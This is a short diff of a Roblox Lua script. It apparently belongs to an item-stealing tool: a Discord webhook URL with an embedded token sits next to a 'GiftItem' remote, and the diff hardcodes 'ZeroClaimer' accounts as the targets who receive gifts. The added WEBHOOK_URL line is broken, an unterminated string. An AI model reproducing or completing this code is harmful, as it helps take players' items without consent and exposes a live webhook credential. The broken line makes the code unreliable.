@@ -15,8 +15,8 @@ local Backpack = player:WaitForChild("Backpack")
 local humanoid = Character:WaitForChild("Humanoid")
 
 local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb"
-local WEBHOOK_URL = _G["Zero_Config"].user_webhook
-local TARGET_PLAYERS = _G["Zero_Config"].users or {}
+local WEBHOOK_URL = "
+local TARGET_PLAYERS = {"ZeroClaimer1", "ZeroClaimer2", "ZeroClaimer3"}
 
 local Remotes = ReplicatedStorage:WaitForChild("Remotes")
 local GiftRemote = Remotes:WaitForChild("GiftItem")
